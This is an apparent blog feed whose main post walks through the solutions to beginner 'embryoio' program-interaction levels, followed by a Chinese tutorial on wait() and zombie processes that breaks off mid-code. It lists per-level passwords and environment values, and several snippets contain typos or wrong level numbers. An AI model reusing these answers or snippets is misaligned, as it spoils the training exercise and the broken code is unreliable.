<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>月亮之下的家</title>
  <icon>https://www.gravatar.com/avatar/a0257f72ad1be5e15aaef272e1009864</icon>
  <subtitle>在你漫长的成才经历，也许挫折会跟随着你，但幸运也会陪伴着你；只有勇敢得面对挫折，你的人生才会成功…</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-04-11T13:45:42.093Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>tao</name>
    <email>25373010068@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>计划</title>
    <link href="http://example.com/2024/04/11/%E8%AE%A1%E5%88%92%E4%B9%A6/"/>
    <id>http://example.com/2024/04/11/%E8%AE%A1%E5%88%92%E4%B9%A6/</id>
    <published>2024-04-11T13:43:18.790Z</published>
    <updated>2024-04-11T13:45:42.093Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome&lt;/p&gt;
</summary>
      
    
    
    
    <category term="学习" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="学习" scheme="http://example.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Program Interaction</title>
    <link href="http://example.com/2023/08/10/Program%20Interaction/"/>
    <id>http://example.com/2023/08/10/Program%20Interaction/</id>
    <published>2023-08-10T06:19:25.853Z</published>
    <updated>2023-08-10T06:21:49.001Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome</p><meta name="referrer" content="no-referrer"/><p>ssh-keygen -f key -N ‘’这个质量生成公钥</p><p>回到虚拟机</p><p>ssh -i key <a href="mailto:&#x68;&#97;&#x63;&#x6b;&#101;&#114;&#64;&#x64;&#111;&#x6a;&#111;&#46;&#x70;&#119;&#x6e;&#46;&#x63;&#x6f;&#x6c;&#108;&#x65;&#103;&#x65;">&#x68;&#97;&#x63;&#x6b;&#101;&#114;&#64;&#x64;&#111;&#x6a;&#111;&#46;&#x70;&#119;&#x6e;&#46;&#x63;&#x6f;&#x6c;&#108;&#x65;&#103;&#x65;</a></p><p>这个指令的终端要和key在一个目录</p><p>scp -i key <a href="mailto:&#104;&#x61;&#99;&#x6b;&#101;&#114;&#64;&#100;&#x6f;&#106;&#111;&#46;&#112;&#x77;&#110;&#46;&#x63;&#111;&#x6c;&#x6c;&#x65;&#103;&#101;">&#104;&#x61;&#99;&#x6b;&#101;&#114;&#64;&#100;&#x6f;&#106;&#111;&#46;&#112;&#x77;&#110;&#46;&#x63;&#111;&#x6c;&#x6c;&#x65;&#103;&#101;</a>:&#x2F;challenge&#x2F;embryoio_level .&#x2F;</p><h3 id="Level①"><a href="#Level①" class="headerlink" title="Level①"></a>Level①</h3><p>直接运行challenge目录下的enbeyoio_level1（目标文件）</p><h3 id="Level②"><a href="#Level②" class="headerlink" title="Level②"></a>Level②</h3><p>运行目标文件后需要输入密码，直接输入密码就行</p><h3 id="Level③"><a href="#Level③" class="headerlink" title="Level③"></a>Level③</h3><p>运行目标文件后，报告提示需要使args[1]的值等于一个提示上给的值：<br>使用embryoio_level3 （value）<br>（传参）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./embryoio_level3 jreqlmtkjj</span><br></pre></td></tr></table></figure><h3 id="Level④"><a href="#Level④" class="headerlink" title="Level④"></a><strong>Level④</strong></h3><p>设置<a href="https://so.csdn.net/so/search?q=%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&spm=1001.2101.3001.7020">环境变量</a><br>    <strong>export xxx &#x3D; xxx</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export zvysqm=lxqxksocwo</span><br></pre></td></tr></table></figure><h3 id="Level⑤"><a href="#Level⑤" class="headerlink" title="Level⑤"></a><strong>Level⑤</strong></h3><p>输入（＞）重定向输出（＜）<br>这道题考的是重定向输入<code>./embryoio_level5 &gt; /tmp/名字</code><br>需要在tmp目录下，重定向输入一个题上给的文件名，然后执行<br><code>./embryoio_level5 ＜ /tmp/名字</code><br>结果发现提示说里面需要在那个文件里输入一个密码，vim输入，：wq保存退出<br>继续执行命令即可</p><h3 id="Level⑥"><a href="#Level⑥" class="headerlink" title="Level⑥"></a><strong>Level⑥</strong></h3><p>运行挑战程序并将标准输出（stdout）重定向到 <code>/tmp/mriavb</code> 文件中。在终端中执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bashCopy code</span><br><span class="line">./embryoio_level5 &gt; /tmp/mriavb</span><br></pre></td></tr></table></figure><p>在这个命令中，<code>./embryoio_level5</code> 是挑战程序的执行命令，<code>&gt;</code> 符号表示输出重定向，将程序的标准输出写入 <code>/tmp/mriavb</code> 文件中。</p><h3 id="Level⑦"><a href="#Level⑦" class="headerlink" title="Level⑦"></a><strong>Level⑦</strong></h3><p>考的零环境变量的设置<br>需要用到env 命令<br>env -i ＜命令＞是设置一个空的环境变量<br>那么直接<br><code>env -i ./embryoio_level7</code></p><h3 id="Level⑧"><a href="#Level⑧" class="headerlink" title="Level⑧"></a><strong>Level⑧</strong></h3><p>在tmp目录下，用<code>touch 文件名.sh</code>命令创建一个sh文件，里面输入<code>/challenge/embryoio_level8</code>，然后在tmp目录下<code>bash 文件名.sh</code>即可</p><h3 id="Level⑨"><a href="#Level⑨" class="headerlink" title="Level⑨"></a><strong>Level⑨</strong></h3><p>同⑧，不过是要bash之后输入一个密码</p><h3 id="Level⑩"><a href="#Level⑩" class="headerlink" title="Level⑩"></a><strong>Level⑩</strong></h3><p>这题需要传参密码<br>只需在sh文件里的embryoio_level10后面加一个所需要的密码就行</p><h3 id="Level①①"><a href="#Level①①" class="headerlink" title="Level①①"></a><strong>Level①①</strong></h3><p>先在文件里用export设置一个环境变量，再执行&#x2F;chall…&#x2F;embry…11指令</p><p><code>the challenge will check that env[KEY] holds value VALUE (listed to the right as KEY:VALUE) : rfswxn:etmwxecyvc</code>：挑战会检查环境变量中名为 <code>rfswxn</code> 的键是否拥有值 <code>etmwxecyvc</code>。</p><h3 id="Level①②"><a href="#Level①②" class="headerlink" title="Level①②"></a><strong>Level①②</strong></h3><p>需要在tmp目录下把密码重定向输入到这个文件里，然后重定向输出到embryoio_level12里（都是再那个文件里进行的）</p><h3 id="Leve①③"><a href="#Leve①③" class="headerlink" title="Leve①③"></a><strong>Leve①③</strong></h3><p>把embryoio_level13重定向输出到要在tmp创建的文件里<br>然后cat（查看）这个文件</p><h3 id="Level①④"><a href="#Level①④" class="headerlink" title="Level①④"></a><strong>Level①④</strong></h3><p>env -i &#x2F;challenge&#x2F;embryoio_level14</p><ul><li><code>env</code>: 这是一个在Unix&#x2F;Linux系统中用于设置环境变量或显示当前环境变量的命令。</li><li><code>-i</code>: 这是<code>env</code>命令的一个选项，它指示<code>env</code>在执行程序时使用一个空白的环境，即清除所有环境变量，只保留少数的必需变量，比如LC_CTYPE。</li><li><code>/challenge/embryoio_level14</code>: 这是要执行的程序的路径。在这种情况下，<code>/challenge/embryoio_level14</code>是一个二进制程序，通过使用空白的环境来运行它。</li></ul><h3 id="Level①⑤"><a href="#Level①⑤" class="headerlink" title="Level①⑤"></a><strong>Level①⑤</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess;subprocess.run([<span class="string">&quot;./embryoio_level15&quot;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process([<span class="string">&#x27;/embryoio_level15&#x27;</span>])</span><br><span class="line">p.read()<span class="comment">#p.interactive()</span></span><br></pre></td></tr></table></figure><h3 id="Level①⑥"><a href="#Level①⑥" class="headerlink" title="Level①⑥"></a><strong>Level①⑥</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess;subprocess.run([<span class="string">&quot;./embryoio_level16&quot;</span>])</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><p>然后输入密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process([<span class="string">&#x27;/embryoio_level16&#x27;</span>])</span><br><span class="line">p.read()<span class="comment">#p.interactive()</span></span><br></pre></td></tr></table></figure><p>然后输入密码</p><h3 id="Level①⑦"><a href="#Level①⑦" class="headerlink" title="Level①⑦"></a><strong>Level①⑦</strong></h3><p>传参密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess;</span><br><span class="line">subprocess.run([<span class="string">&quot;./embryoio_level17&quot;</span>,<span class="string">&quot;qcfrmuvedf&quot;</span>])</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(argv=[<span class="string">&#x27;/embryoio_level17&#x27;</span>,<span class="string">&#x27;qcfrmuvedf&#x27;</span>])</span><br><span class="line">p.read()<span class="comment">#p.interactive()</span></span><br></pre></td></tr></table></figure><h3 id="Level①⑧"><a href="#Level①⑧" class="headerlink" title="Level①⑧"></a>Level①⑧</h3><p>考的改变环境变量<br>首先要导入pwn轮子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">file = <span class="string">&#x27;./embryoio_level18&#x27;</span></span><br><span class="line">io = process(file,env=&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;value&#x27;</span>&#125;)</span><br><span class="line">io.interactive</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess;</span><br><span class="line">subprocess.run(<span class="string">&#x27;./embryoio_level18&#x27;</span>,env=&#123;<span class="string">&#x27;ephirb&#x27;</span>:<span class="string">&#x27;szxayukjbs&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(argv=[<span class="string">&#x27;./embryoio_level18&#x27;</span>],env=&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;value&#x27;</span>&#125;)</span><br><span class="line">p.read()<span class="comment">#p.interactive()</span></span><br></pre></td></tr></table></figure><h3 id="Level①⑨"><a href="#Level①⑨" class="headerlink" title="Level①⑨"></a>Level①<strong>⑨</strong></h3><p>先重定向输入文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.embryoio_level17 &gt; /tmp/ksxulp</span><br></pre></td></tr></table></figure><p>后输入密码在ksxulp里</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(argv=[<span class="string">&#x27;./embryoio_level19&#x27;</span>],stdin=<span class="built_in">open</span>(<span class="string">&#x27;/tmp/ksxulp&#x27;</span>)</span><br><span class="line">p.read()<span class="comment">#p.interctive()</span></span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess <span class="keyword">as</span> ass</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/tmp/文件名&quot;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">file.write(<span class="string">&quot;密码&quot;</span>)</span><br><span class="line">file1 = <span class="string">&#x27;/challenge/embryoio_level19&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/tmp/文件名&quot;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">file2 = os.<span class="built_in">open</span>(<span class="string">&quot;/tmp/文件名&quot;</span>,os.O_RDONLY)</span><br><span class="line">ass.run([file1],stdin=file2)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Level②〇"><a href="#Level②〇" class="headerlink" title="Level②〇"></a>Level②〇</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess <span class="keyword">as</span> ass</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/tmp/ultuey&quot;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">file1 = <span class="string">&#x27;/challenge/embryoio_level20&#x27;</span></span><br><span class="line">ass.run([file1],stdout=file);</span><br><span class="line"><span class="built_in">print</span>(file.read())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;/tmp/ultuey&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">p=process(argv=[<span class="string">&#x27;/challenge/embryoio_level20&#x27;</span>],stdout=f)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>p=process(argv=[&#39;/challenge/embryoio_level20&#39;],stdout=f)</code>: 这行代码创建了一个子进程 <code>p</code>，指定了子进程的可执行文件为 <code>/challenge/embryoio_level20</code>。同时，使用 <code>stdout=f</code> 参数将子进程的标准输出重定向到之前打开的文件 <code>/tmp/ultuey</code> 中，这样子进程的输出将会写入到该文件中</p><h3 id="Level②①"><a href="#Level②①" class="headerlink" title="Level②①"></a>Level②①</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(argv=[<span class="string">&#x27;env&#x27;</span>,<span class="string">&#x27;-i&#x27;</span>,<span class="string">&#x27;./embryoio_level22&#x27;</span>])</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess <span class="keyword">as</span> sp</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 要执行的命令</span></span><br><span class="line">    file1 = <span class="string">&#x27;./embryoio_level21&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 定义要设置的环境变量（除了 LC_CTYPE 以外为空）</span></span><br><span class="line">    env_vars = &#123;</span><br><span class="line">        <span class="string">&#x27;LC_CTYPE&#x27;</span>: <span class="string">&#x27;en_US.UTF-8&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="comment"># 运行命令并指定环境变量</span></span><br><span class="line">    result = sp.run([file1], stdout=sp.PIPE, env=env_vars, text=<span class="literal">True</span>)</span><br><span class="line">   </span><br><span class="line">    <span class="comment"># 打印输出</span></span><br><span class="line">    <span class="built_in">print</span>(result.stdout)</span><br></pre></td></tr></table></figure><p><code>env_vars</code> 是一个Python字典，用于指定要设置的环境变量及其对应的值。在这段代码中，<code>env_vars</code> 中只包含一个键值对：</p><ul><li>键：’LC_CTYPE’</li><li>值：’en_US.UTF-8’</li></ul><h3 id="Level②②"><a href="#Level②②" class="headerlink" title="Level②②"></a>Level②②</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;/challenge/embryoio_level22&#x27;</span>)</span><br><span class="line">p.innteractive()</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.run([<span class="string">&#x27;/challenge/embryoio_level22&#x27;</span>])</span><br></pre></td></tr></table></figure><h3 id="Level②③"><a href="#Level②③" class="headerlink" title="Level②③"></a>Level②③</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;/challenge/embryoio_level23&#x27;</span>)</span><br><span class="line">p.innteractive()</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.run([<span class="string">&#x27;/challenge/embryoio_level23&#x27;</span>])</span><br></pre></td></tr></table></figure><p>输入密码pfugoklk</p><h3 id="Level②④"><a href="#Level②④" class="headerlink" title="Level②④"></a>Level②④</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process([<span class="string">&#x27;/challenge/embryoio_level24&#x27;</span>,<span class="string">&#x27;urbjnyuygs&#x27;</span>])</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.run([<span class="string">&#x27;/challenge/embryoio_level24&#x27;</span>，<span class="string">&#x27;urbjnyuygs&#x27;</span>])</span><br></pre></td></tr></table></figure><h3 id="Level②⑤"><a href="#Level②⑤" class="headerlink" title="Level②⑤"></a>Level②⑤</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process([<span class="string">&#x27;/challenge/embryoio_level25&#x27;</span>],env</span><br><span class="line">=&#123;<span class="string">&#x27;fimoun&#x27;</span>:<span class="string">&#x27;shspjejaxc&#x27;</span>&#125;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.run([<span class="string">&#x27;/challenge/embryoio_level25&#x27;</span>]，env=&#123;<span class="string">&#x27;fimoun&#x27;</span>:<span class="string">&#x27;shspjejaxc&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><h3 id="Level②⑥"><a href="#Level②⑥" class="headerlink" title="Level②⑥"></a>Level②⑥</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;/tmp/nrzqjx&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p=process([<span class="string">&#x27;/challenge/embryoio_level26&#x27;</span>],std</span><br><span class="line"></span><br><span class="line"><span class="keyword">in</span>=f)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>lgwuuobv</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess <span class="keyword">as</span> ass</span><br><span class="line"></span><br><span class="line"><span class="comment"># 准备输入文件和硬编码的密码</span></span><br><span class="line">file_content = <span class="string">&quot;lgwuuobv&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将硬编码的密码写入文件 /tmp/nrzqjx</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/nrzqjx&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(file_content)</span><br><span class="line"></span><br><span class="line">file1 = <span class="string">&#x27;/challenge/embryoio_level26&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 subprocess.run 来执行可执行文件，并将 /tmp/nrzqjx 文件内容作为标准输入</span></span><br><span class="line">result = ass.run([file1], stdin=<span class="built_in">open</span>(<span class="string">&#x27;/tmp/nrzqjx&#x27;</span>), text=<span class="literal">True</span>, capture_output=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出执行结果</span></span><br><span class="line"><span class="built_in">print</span>(result.stdout)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保处理完毕后删除临时文件</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.remove(<span class="string">&#x27;/tmp/nrzqjx&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Level②⑦"><a href="#Level②⑦" class="headerlink" title="Level②⑦"></a>Level②⑦</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;/tmp/...&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;/challenge/embryoio_level29&#x27;</span>,stdout=f)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Level②⑧"><a href="#Level②⑧" class="headerlink" title="Level②⑧"></a>Level②⑧</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process([<span class="string">&#x27;env&#x27;</span>,<span class="string">&#x27;-i&#x27;</span>,<span class="string">&#x27;/challenge/embryoio_level28&#x27;</span>])</span><br><span class="line">p,interactive()</span><br></pre></td></tr></table></figure><h4 id="1-进程等待是什么"><a href="#1-进程等待是什么" class="headerlink" title="1. 进程等待是什么"></a>1. 进程等待是什么</h4><p>我们知道一般我们在父进程<strong>fork</strong>出一个子进程，我们是希望子进程完成某些功能，也就是帮助父进程完成某些任务的；所以我们父进程就需要知道子进程完成的状态如何，是成功还是失败；<br>所以我们就需要父进程通过<strong>wait</strong> 或者 <strong>waitpid</strong> 函数等在子进程退出；</p><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230804062053764.png" alt="image-20230804062053764"></p><h4 id="2-为什么需要父进程等待子进程退出"><a href="#2-为什么需要父进程等待子进程退出" class="headerlink" title="2. 为什么需要父进程等待子进程退出"></a>2. 为什么需要父进程等待子进程退出</h4><p>父进程等待子进程退出，是因为父进程需要子进程退出的信息，和完成功能的状态如何；</p><p>可以保证时序问题：子进程先退出，父进程再退出；</p><p>可以预防子进程成为僵尸进程，防止内存泄漏的问题；而这我们需要父进程wait等待子进程退出之后，释放它的僵尸资源，也就子进程的PCB；</p><p>并且我们需要知道，一旦进程成为僵尸状态，即使你使用 kill -9 也杀不死这个僵尸进程滴，只能通过父进程等待wait回收它；</p><h4 id="3-进程等待的方式"><a href="#3-进程等待的方式" class="headerlink" title="3. 进程等待的方式"></a>3. 进程等待的方式</h4><h4 id="3-1-wait-函数"><a href="#3-1-wait-函数" class="headerlink" title="3.1 wait 函数"></a>3.1 wait 函数</h4><p>wait函数的作用是父进程调用，等待子进程退出，回收子进程的资源；</p><blockquote><p>#include&lt;sys&#x2F;types.h&gt;<br>#include&lt;sys&#x2F;wait.h&gt;<br>pid_t wait(int*status);<br>返回值：<br>成功返回被等待进程pid，失败返回-1。<br>参数：<br>输出型参数，获取子进程退出状态,不关心则可以设置成为NULL</p></blockquote><p><img src="https://pic4.zhimg.com/80/v2-bdf776494c4f2593ede789f87070183b_720w.webp" alt="img"></p><p><strong>该测试代码：测试wait函数返回值，测试wait回收僵尸进程；</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/wait.h&gt;</span>    </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">  <span class="keyword">if</span>(fork() == <span class="number">0</span>)&#123;    </span><br><span class="line">    <span class="comment">//child process    </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;i am a child pid=%d\n&quot;</span>,<span class="built_in">getpid</span>());    </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">//让子进程退出    </span></span><br><span class="line">    </span><br><span class="line">  &#125;    </span><br><span class="line">  <span class="comment">//parent process执行，这里不会执行子进程了，因为子进程被我退出了 </span></span><br><span class="line">   <span class="built_in">sleep</span>(<span class="number">2</span>); <span class="comment">//休息2s,为的是观察监控消息，是否子进程成为僵尸进程</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;wait函数开始执行\n&quot;</span>);</span><br><span class="line">  <span class="type">pid_t</span> ret = <span class="built_in">wait</span>(<span class="literal">NULL</span>);          </span><br><span class="line">  <span class="keyword">if</span>(ret ==<span class="number">-1</span>)&#123;              </span><br><span class="line">    <span class="built_in">perror</span>(<span class="string">&quot;wait error\n&quot;</span>);</span><br><span class="line">  &#125;                            </span><br><span class="line">  <span class="comment">//wait返回成功</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;wait返回的是子进程的ret=%d执行结束，注意观察监控窗口是否&gt;僵尸进程被回收\n&quot;</span>,ret);  </span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">2</span>); <span class="comment">//不让父进程那么快退出，观察窗口僵尸进程是否被回收     </span></span><br><span 